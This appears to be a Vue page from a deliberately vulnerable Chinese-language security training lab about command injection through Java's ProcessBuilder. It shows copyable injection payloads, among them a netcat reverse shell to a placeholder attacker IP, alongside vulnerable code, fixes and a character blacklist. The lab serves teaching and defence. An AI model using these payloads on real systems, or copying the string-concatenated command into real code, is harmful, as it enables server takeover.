<template>
  <vuln-template
    title="企业网络诊断平台"
    subtitle="Network Diagnostic Tool - RCE via ProcessBuilder"
    level="严重"
    :icon="ThunderboltOutlined"
    moduleKey="rce_processbuilder"
  >
    <template #description>
      <a-typography-paragraph>
        <strong>业务场景：</strong>模拟企业内网的网络诊断平台，为运维人员提供 Ping、Traceroute、DNS 查询等网络诊断功能。
      </a-typography-paragraph>
      <a-typography-paragraph>
        <strong>漏洞原理：</strong>后端使用 ProcessBuilder 执行系统命令时，将用户输入的 IP 地址/域名直接拼接到命令字符串中，未进行参数化处理。攻击者可以通过命令分隔符（如 <code>&amp;&amp;</code>、<code>|</code>、<code>;</code>）注入任意系统命令。
      </a-typography-paragraph>
      <a-alert
        message="真实案例：许多企业内部运维平台、网络监控系统都提供类似的诊断功能，如果开发时未注意命令注入风险，可能导致服务器被完全控制。"
        type="info"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #payload>
      <a-typography-paragraph>
        <strong>攻击场景演示：</strong>
      </a-typography-paragraph>

      <a-card size="small" style="margin-bottom: 12px; background: #f6f8fa;">
        <div style="display: flex; align-items: center; margin-bottom: 8px;">
          <a-tag color="green">正常使用</a-tag>
          <span style="margin-left: 8px; color: #666;">运维人员诊断网络连通性</span>
        </div>
        <a-typography-paragraph code copyable style="margin: 0;">
          8.8.8.8
        </a-typography-paragraph>
        <div style="margin-top: 8px; color: #95a5a6; font-size: 12px;">
          → 执行命令：<code>ping -n 1 8.8.8.8</code>
        </div>
      </a-card>

      <a-card size="small" style="margin-bottom: 12px; background: #fff8e6;">
        <div style="display: flex; align-items: center; margin-bottom: 8px;">
          <a-tag color="orange">命令注入 - 信息收集</a-tag>
          <span style="margin-left: 8px; color: #666;">获取服务器当前用户</span>
        </div>
        <a-typography-paragraph code copyable style="margin: 0;">
          127.0.0.1 &amp;&amp; whoami
        </a-typography-paragraph>
        <div style="margin-top: 8px; color: #95a5a6; font-size: 12px;">
          → 执行命令：<code>ping -n 1 127.0.0.1 &amp;&amp; whoami</code>
        </div>
      </a-card>

      <a-card size="small" style="margin-bottom: 12px; background: #fff1f0;">
        <div style="display: flex; align-items: center; margin-bottom: 8px;">
          <a-tag color="red">命令注入 - 文件读取</a-tag>
          <span style="margin-left: 8px; color: #666;">读取敏感配置文件</span>
        </div>
        <a-typography-paragraph code copyable style="margin: 0;">
          127.0.0.1 &amp;&amp; type C:\Windows\System32\drivers\etc\hosts
        </a-typography-paragraph>
        <div style="margin-top: 8px; color: #95a5a6; font-size: 12px;">
          → Windows：读取 hosts 文件
        </div>
      </a-card>

      <a-card size="small" style="margin-bottom: 12px; background: #fff1f0;">
        <div style="display: flex; align-items: center; margin-bottom: 8px;">
          <a-tag color="red">命令注入 - 目录遍历</a-tag>
          <span style="margin-left: 8px; color: #666;">列出服务器目录结构</span>
        </div>
        <a-typography-paragraph code copyable style="margin: 0;">
          127.0.0.1 | dir C:\
        </a-typography-paragraph>
        <div style="margin-top: 8px; color: #95a5a6; font-size: 12px;">
          → Windows：使用管道符列出 C 盘根目录
        </div>
      </a-card>

      <a-card size="small" style="margin-bottom: 12px; background: #fff1f0;">
        <div style="display: flex; align-items: center; margin-bottom: 8px;">
          <a-tag color="red">命令注入 - 反弹Shell</a-tag>
          <span style="margin-left: 8px; color: #666;">建立远程控制连接（高级）</span>
        </div>
        <a-typography-paragraph code copyable style="margin: 0;">
          127.0.0.1; nc -e /bin/bash 攻击者IP 4444
        </a-typography-paragraph>
        <div style="margin-top: 8px; color: #95a5a6; font-size: 12px;">
          → Linux：使用分号分隔，反弹 Shell 到攻击者服务器
        </div>
      </a-card>

      <a-alert
        message="防御建议：使用参数化命令执行、严格的输入验证（IP格式白名单）、避免使用 sh -c 或 cmd /c 拼接字符串"
        type="warning"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #test-form>
      <a-card title="🔧 网络诊断工具" size="small" style="margin-bottom: 16px;">
        <a-form :model="formState" @finish="handleSubmit" layout="vertical">
          <a-form-item
            label="目标地址"
            name="ip"
            :rules="[{ required: true, message: '请输入目标 IP 地址或域名' }]"
          >
            <a-input
              v-model:value="formState.ip"
              size="large"
              placeholder="例如：192.168.1.1 或 www.example.com"
            >
              <template #prefix>
                <global-outlined style="color: rgba(0,0,0,.25)" />
              </template>
            </a-input>
            <div style="margin-top: 8px; color: #95a5a6; font-size: 12px;">
              💡 提示：支持 IPv4 地址和域名格式
            </div>
          </a-form-item>

          <a-form-item label="诊断选项">
            <a-space direction="vertical" style="width: 100%;">
              <a-checkbox v-model:checked="formState.safe">
                <span style="color: #52c41a;">🛡️ 启用安全检测</span>
                <span style="margin-left: 8px; color: #95a5a6; font-size: 12px;">（过滤命令注入字符）</span>
              </a-checkbox>
              <div style="padding: 8px 12px; background: #f0f2f5; border-radius: 4px; font-size: 12px; color: #666;">
                <strong>说明：</strong>安全检测会过滤 <code>&amp;&amp;</code>、<code>|</code>、<code>;</code> 等命令分隔符，防止命令注入攻击。关闭后可用于漏洞演示。
              </div>
            </a-space>
          </a-form-item>

          <a-form-item>
            <a-space size="middle">
              <a-button type="primary" html-type="submit" size="large" :loading="loading">
                <template #icon><play-circle-outlined /></template>
                开始诊断
              </a-button>
              <a-button size="large" @click="handleReset">
                <template #icon><redo-outlined /></template>
                重置
              </a-button>
            </a-space>
          </a-form-item>
        </a-form>
      </a-card>
    </template>

    <template #result v-if="result">
      <a-card title="📊 诊断结果" size="small">
        <div style="background: #1e1e1e; padding: 16px; border-radius: 4px; color: #d4d4d4; font-family: 'Consolas', 'Monaco', monospace; font-size: 13px; line-height: 1.6;">
          <div style="color: #4ec9b0; margin-bottom: 8px;">
            ┌─[网络诊断工具 v1.0]
          </div>
          <div style="color: #4ec9b0; margin-bottom: 12px;">
            └─$ 执行命令输出：
          </div>
          <pre style="margin: 0; color: #d4d4d4; white-space: pre-wrap; word-wrap: break-word;">{{ result }}</pre>
        </div>

        <a-alert
          v-if="result && !result.includes('错误') && !result.includes('检测到非法命令注入')"
          message="⚠️ 安全警告"
          description="命令成功执行表明存在 RCE 漏洞！攻击者可以通过命令注入执行任意系统命令，获取服务器控制权限。"
          type="error"
          show-icon
          style="margin-top: 16px"
        />

        <a-alert
          v-if="result && result.includes('检测到非法命令注入')"
          message="✅ 安全检测生效"
          description="系统成功拦截了命令注入尝试。这是正确的防御措施。"
          type="success"
          show-icon
          style="margin-top: 16px"
        />
      </a-card>
    </template>

    <template #source-code>
      <a-typography-paragraph>
        <strong>漏洞代码分析：</strong>
      </a-typography-paragraph>

      <a-card size="small" style="margin-bottom: 16px; border-left: 4px solid #ff4d4f;">
        <div style="margin-bottom: 12px;">
          <a-tag color="red">危险代码</a-tag>
          <span style="margin-left: 8px; color: #666;">直接拼接用户输入到系统命令</span>
        </div>
        <div style="position: relative;">
          <a-typography-paragraph copyable :copy-text="sourceCode" style="margin: 0;">
            <pre class="code-block" style="background: #fafafa; padding: 16px; border-radius: 4px; overflow-x: auto;"><code style="font-family: 'Consolas', 'Monaco', monospace; font-size: 13px;">{{ sourceCode }}</code></pre>
          </a-typography-paragraph>
        </div>
      </a-card>

      <a-alert
        message="核心漏洞"
        type="error"
        show-icon
        style="margin-bottom: 16px"
      >
        <template #description>
          <div style="line-height: 1.8;">
            <p style="margin: 0 0 8px 0;"><strong>1. 字符串拼接风险：</strong></p>
            <p style="margin: 0 0 12px 0; padding-left: 16px;">
              代码使用 <code>"ping -n 1 " + ip</code> 直接拼接用户输入，当用户输入 <code>127.0.0.1 &amp;&amp; whoami</code> 时，
              实际执行的命令变成：<code>ping -n 1 127.0.0.1 &amp;&amp; whoami</code>
            </p>

            <p style="margin: 0 0 8px 0;"><strong>2. sh -c 的危险性：</strong></p>
            <p style="margin: 0 0 12px 0; padding-left: 16px;">
              Linux 下使用 <code>sh -c</code> 会将整个字符串作为 shell 脚本执行，命令分隔符（<code>&amp;&amp;</code>、<code>|</code>、<code>;</code>）会被 shell 解析，
              导致可以执行多条命令。
            </p>

            <p style="margin: 0 0 8px 0;"><strong>3. 攻击者可以：</strong></p>
            <ul style="margin: 0; padding-left: 32px;">
              <li>读取服务器敏感文件（配置文件、密钥等）</li>
              <li>执行系统命令获取服务器信息</li>
              <li>创建后门账户或反弹 Shell</li>
              <li>修改或删除服务器文件</li>
            </ul>
          </div>
        </template>
      </a-alert>
    </template>

    <template #fix>
      <a-typography-paragraph>
        <strong>安全修复方案：</strong>
      </a-typography-paragraph>

      <a-collapse :bordered="false" style="background: #fafafa;">
        <a-collapse-panel key="1" header="方案一：使用 Java API 替代系统命令（推荐）">
          <a-card size="small" style="border-left: 4px solid #52c41a;">
            <div style="margin-bottom: 12px;">
              <a-tag color="green">最佳实践</a-tag>
              <span style="margin-left: 8px; color: #666;">完全避免执行系统命令</span>
            </div>
            <a-typography-paragraph copyable :copy-text="fixCode2" style="margin: 0;">
              <pre class="code-block" style="background: #f6ffed; padding: 16px; border-radius: 4px; overflow-x: auto;"><code style="font-family: 'Consolas', 'Monaco', monospace; font-size: 13px;">{{ fixCode2 }}</code></pre>
            </a-typography-paragraph>
            <div style="margin-top: 12px; padding: 12px; background: #fff; border-radius: 4px;">
              <strong>优点：</strong>
              <ul style="margin: 8px 0 0 0; padding-left: 20px;">
                <li>完全避免命令注入风险</li>
                <li>跨平台兼容性好</li>
                <li>性能更优</li>
              </ul>
            </div>
          </a-card>
        </a-collapse-panel>

        <a-collapse-panel key="2" header="方案二：参数化命令执行 + 严格输入验证">
          <a-card size="small" style="border-left: 4px solid #1890ff;">
            <div style="margin-bottom: 12px;">
              <a-tag color="blue">安全加固</a-tag>
              <span style="margin-left: 8px; color: #666;">如果必须使用系统命令</span>
            </div>
            <a-typography-paragraph copyable :copy-text="fixCode3" style="margin: 0;">
              <pre class="code-block" style="background: #e6f7ff; padding: 16px; border-radius: 4px; overflow-x: auto;"><code style="font-family: 'Consolas', 'Monaco', monospace; font-size: 13px;">{{ fixCode3 }}</code></pre>
            </a-typography-paragraph>
            <div style="margin-top: 12px; padding: 12px; background: #fff; border-radius: 4px;">
              <strong>关键点：</strong>
              <ul style="margin: 8px 0 0 0; padding-left: 20px;">
                <li><strong>不使用 sh -c 或 cmd /c：</strong>直接传递命令和参数数组</li>
                <li><strong>严格的输入验证：</strong>只允许合法的 IP 地址格式</li>
                <li><strong>参数分离：</strong>命令和参数分开传递，不拼接字符串</li>
              </ul>
            </div>
          </a-card>
        </a-collapse-panel>

        <a-collapse-panel key="3" header="方案三：命令分隔符过滤（不推荐，仅作防御层）">
          <a-card size="small" style="border-left: 4px solid #faad14;">
            <div style="margin-bottom: 12px;">
              <a-tag color="orange">辅助防御</a-tag>
              <span style="margin-left: 8px; color: #666;">不应作为唯一防御手段</span>
            </div>
            <a-typography-paragraph copyable :copy-text="fixCode4" style="margin: 0;">
              <pre class="code-block" style="background: #fffbe6; padding: 16px; border-radius: 4px; overflow-x: auto;"><code style="font-family: 'Consolas', 'Monaco', monospace; font-size: 13px;">{{ fixCode4 }}</code></pre>
            </a-typography-paragraph>
            <div style="margin-top: 12px; padding: 12px; background: #fff; border-radius: 4px;">
              <strong>⚠️ 局限性：</strong>
              <ul style="margin: 8px 0 0 0; padding-left: 20px; color: #d46b08;">
                <li>黑名单容易被绕过（编码、特殊字符等）</li>
                <li>不同 Shell 有不同的特殊字符</li>
                <li>应该与其他方案结合使用，不能单独依赖</li>
              </ul>
            </div>
          </a-card>
        </a-collapse-panel>

        <a-collapse-panel key="4" header="其他安全加固措施">
          <a-card size="small">
            <ul style="line-height: 2; margin: 0; padding-left: 20px;">
              <li><strong>最小权限原则：</strong>使用低权限用户运行应用程序</li>
              <li><strong>容器隔离：</strong>使用 Docker 等容器技术隔离应用</li>
              <li><strong>安全审计：</strong>记录所有命令执行日志，便于追踪</li>
              <li><strong>WAF 防护：</strong>在 Web 应用防火墙层面拦截命令注入</li>
              <li><strong>定期安全扫描：</strong>使用 SAST/DAST 工具检测代码漏洞</li>
            </ul>
          </a-card>
        </a-collapse-panel>
      </a-collapse>

      <a-alert
        message="安全开发建议"
        type="info"
        show-icon
        style="margin-top: 16px"
      >
        <template #description>
          <div style="line-height: 1.8;">
            <p style="margin: 0 0 8px 0;">在实际开发中，应该遵循以下原则：</p>
            <ol style="margin: 0; padding-left: 20px;">
              <li><strong>优先使用 API：</strong>能用 Java API 就不用系统命令</li>
              <li><strong>白名单验证：</strong>只允许预期的输入格式，拒绝其他所有输入</li>
              <li><strong>参数化执行：</strong>命令和参数分离，避免字符串拼接</li>
              <li><strong>深度防御：</strong>多层防御机制，不依赖单一防护手段</li>
            </ol>
          </div>
        </template>
      </a-alert>
    </template>
  </vuln-template>
</template>

<script setup>
import { reactive, ref } from 'vue'
import { message } from 'ant-design-vue'
import { ThunderboltOutlined, PlayCircleOutlined, RedoOutlined, GlobalOutlined } from '@ant-design/icons-vue'
import VulnTemplate from '@/components/VulnTemplate.vue'
import axios from 'axios'

const loading = ref(false)
const result = ref('')

const sourceCode = `@RestController
@RequestMapping("/home/rce")
public class ProcessBuilderExec {
    @RequestMapping("/processbuilder")
    public String ProcessBuilderExec(String ip, String safe) {
        String os = System.getProperty("os.name").toLowerCase();
        String[] cmdList;

        if (os.contains("win")) {
            // ⚠️ 漏洞点：直接将用户输入拼接到命令中
            cmdList = new String[]{"cmd", "/c", "ping -n 1 " + ip};
        } else {
            // ⚠️ 漏洞点：使用 sh -c 执行拼接的命令字符串
            cmdList = new String[]{"sh", "-c", "ping -c 1 " + ip};
        }

        ProcessBuilder pb = new ProcessBuilder(cmdList);
        Process process = pb.start();
        // 读取并返回命令输出...
    }
}`

const fixCode2 = `// 使用 InetAddress API 替代 ping 命令
import java.net.InetAddress;

@RequestMapping("/processbuilder")
public String ProcessBuilderExec(String ip) {
    try {
        // 验证 IP 格式
        InetAddress addr = InetAddress.getByName(ip);

        // 测试可达性（超时 5 秒）
        boolean reachable = addr.isReachable(5000);

        return "目标地址: " + ip + "\\n" +
               "主机名: " + addr.getHostName() + "\\n" +
               "可达性: " + (reachable ? "✓ 可达" : "✗ 不可达");
    } catch (Exception e) {
        return "错误: 无效的 IP 地址或域名";
    }
}`

const fixCode3 = `@RequestMapping("/processbuilder")
public String ProcessBuilderExec(String ip) {
    // 1. 严格的 IP 格式验证（白名单）
    if (!ip.matches("^([0-9]{1,3}\\\\.){3}[0-9]{1,3}$")) {
        return "错误: 无效的 IP 地址格式";
    }

    // 2. 验证 IP 范围（0-255）
    String[] parts = ip.split("\\\\.");
    for (String part : parts) {
        int num = Integer.parseInt(part);
        if (num < 0 || num > 255) {
            return "错误: IP 地址超出有效范围";
        }
    }

    // 3. 使用参数分离，避免 sh -c 或 cmd /c
    String[] cmdList;
    String os = System.getProperty("os.name").toLowerCase();

    if (os.contains("win")) {
        // ✓ 正确：参数分离，不拼接字符串
        cmdList = new String[]{"ping", "-n", "1", ip};
    } else {
        // ✓ 正确：参数分离，不使用 sh -c
        cmdList = new String[]{"ping", "-c", "1", ip};
    }

    ProcessBuilder pb = new ProcessBuilder(cmdList);
    Process process = pb.start();
    // 读取输出...
}`

const fixCode4 = `// 黑名单过滤（容易被绕过，不推荐）
private static final String[] DANGEROUS_CHARS = {
    "&&", "||", "|", ";", "` + '`' + `", "$", "(", ")",
    "<", ">", "\\n", "\\r", "&"
};

public boolean isSafeInput(String input) {
    for (String dangerous : DANGEROUS_CHARS) {
        if (input.contains(dangerous)) {
            return false;
        }
    }
    return true;
}

@RequestMapping("/processbuilder")
public String ProcessBuilderExec(String ip) {
    if (!isSafeInput(ip)) {
        return "检测到非法命令注入";
    }
    // 继续执行...
}`

const formState = reactive({
  ip: '',
  safe: false
})

const handleSubmit = async () => {
  loading.value = true
  try {
    const params = {
      ip: formState.ip
    }
    if (formState.safe) {
      params.safe = 'true'
    }
    const response = await axios.get('/home/rce/processbuilder', {
      params: params
    })
    result.value = response.data
    message.success('诊断完成')
  } catch (error) {
    message.error('诊断失败：' + (error.response?.data || error.message))
  } finally {
    loading.value = false
  }
}

const handleReset = () => {
  formState.ip = ''
  formState.safe = false
  result.value = ''
}
</script>
